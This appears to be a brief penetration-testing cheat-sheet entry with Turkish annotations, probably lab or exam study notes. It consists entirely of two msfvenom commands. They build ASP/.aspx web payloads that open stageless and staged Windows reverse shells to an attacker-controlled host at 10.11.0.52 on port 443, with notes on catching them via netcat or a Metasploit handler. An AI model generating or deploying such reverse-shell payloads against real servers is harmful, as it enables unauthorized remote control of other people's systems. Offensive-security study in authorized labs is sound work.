### Unstage & Stage Shell

Unstage Shell: (karşılaması nc -nvlp)
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.52 LPORT=443 -f asp > aspunstage-52.aspx
```
Stage Shell: (karşılaması msfconsole handler)
```
msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.52 LPORT=443 -f asp > aspstage_52.aspx
```
